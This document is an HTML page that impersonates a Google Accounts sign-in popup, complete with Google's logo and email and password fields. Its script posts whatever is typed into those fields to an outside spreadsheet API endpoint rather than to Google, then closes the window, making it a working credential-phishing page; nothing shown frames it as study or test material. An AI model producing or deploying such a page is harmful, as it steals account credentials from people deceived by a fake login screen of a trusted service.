<head>
  <title>Sign In - Google Accounts</title>
  <script
		src="https://code.jquery.com/jquery-3.4.1.js"
		integrity="sha256-WpOohJOqMqqyKL9FccASB9O0KwACQJpFTUBLTYOVvVU="
		crossorigin="anonymous"></script>
	<script>
		function SubForm (){
			$.ajax({
				url:"https://api.apispreadsheets.com/data/we5mACpoNqHXXSFC/",
				type:"post",
				data:$("#myForm").serializeArray(),
				success: function(){
          close()
				},
				error: function(){
          close()
				}
			});
		}
	</script>
  </head>

<link rel="stylesheet" type="text/css" href="style/stylesheet-popup.css">

<div class="container">
    <div class="card">
      <div class="header">
        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google" height="24">
        <div class="title">Sign in</div>
        <div class="tagline">Use your Google Account</div>
      </div>
      
      <form id="myForm" action="">
        <input name="nameField" type="text">
        <label for="nameField">Email or phone</label>
        
        <input name="passwordField" type="password">
        <label for="passwordField">Password</label>
      </form>
      
      <div class="links">Forgot email?</div>
      <div class="guest">Not your computer? Use Guest mode to sign in privately.</div>
      <div class="links">Learn more</div>
      <div class="login-bar">
        <div class="links">Create account</div>
        <button class="next" onclick="SubForm()">Next</button>
      </div>

    </div>
  </div>
